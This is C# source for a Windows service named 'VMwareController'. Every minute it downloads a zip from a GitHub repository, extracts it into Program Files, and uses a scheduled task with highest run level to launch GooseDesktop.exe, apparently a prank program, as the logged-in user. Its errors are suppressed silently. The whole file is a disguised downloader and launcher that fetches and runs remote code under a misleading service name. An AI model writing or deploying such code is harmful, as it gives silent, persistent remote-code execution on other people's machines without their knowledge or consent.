using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Management;


namespace VMwareController
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            timer = new Timer(60000);
            timer.Elapsed += DoCoolThing;
            timer.Start();

        }

        protected override void OnStop()
        {
            timer.Stop();
        }

        private void DoCoolThing(object sender, ElapsedEventArgs e)
        {
            try
            {
                string url = "https://github.com/burner-afk/grouse/archive/refs/heads/main.zip";
                string localZipPath = "C:\\Program Files\\grouse-main.zip";
                string extractPath = "C:\\Program Files\\grouse-main";
                string exePath = "C:\\Program Files\\grouse-main\\grouse-main\\DesktopGoose v0.31\\GooseDesktop.exe";
                string username = GetLoggedInUsername();
                if (username == null)
                {
                    return;
                }

                string taskName = "ShowMyApp";
                string startTime = DateTime.Now.AddMinutes(1).ToString("HH:mm");

                string createCmd = $"/Create /TN \"ShowMyApp\" /TR \"{exePath}\" " + $"/SC ONCE /ST {startTime} /RL HIGHEST /F /RU \"{username}\"";


                if (!File.Exists(exePath))
                {
                    if (Directory.Exists(extractPath))
                    {
                        Directory.Delete(extractPath, true);
                    }

                    Directory.CreateDirectory(Path.GetDirectoryName(localZipPath));
                    Directory.CreateDirectory(extractPath);

                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(url, localZipPath);
                    }
                    ZipFile.ExtractToDirectory(localZipPath, extractPath);
                    File.Delete(localZipPath);

                }

                

                

                if (File.Exists(exePath))
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = createCmd,



                    };
                    Process.Start(psi);

                    System.Threading.Thread.Sleep(2000);
                    Process.Start("schtasks.exe", $"/Run /TN \"{taskName}\"");

                }


            }
            catch
            {

            }
            
        }

        public static string GetLoggedInUsername()
        {
            try
            {
                var query = new SelectQuery("Win32_ComputerSystem");
                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        string user = mo["UserName"]?.ToString();
                        if (!string.IsNullOrEmpty(user))
                        {
                            var parts = user.Split('\\');
                            return parts.Length == 2 ? parts[1] : user;
                        }
                    }
                }
            }
            catch { }
            return null;
        }
    }
}
